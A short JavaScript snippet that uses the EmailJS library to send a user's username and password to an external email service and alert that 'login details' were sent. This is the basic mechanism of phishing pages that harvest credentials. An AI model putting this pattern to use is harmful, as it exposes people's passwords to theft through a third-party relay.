emailjs
  .send("service_2bhff34", "template_abc123", {
    username: username,
    password: password,
  })
  .then(
    function (response) {
      alert("Login details sent successfully!");
      console.log("SUCCESS!", response.status, response.text);
    },
    function (error) {
      alert("Failed to send login details. Please try again.");
      console.error("FAILED...", error);
    }
  );
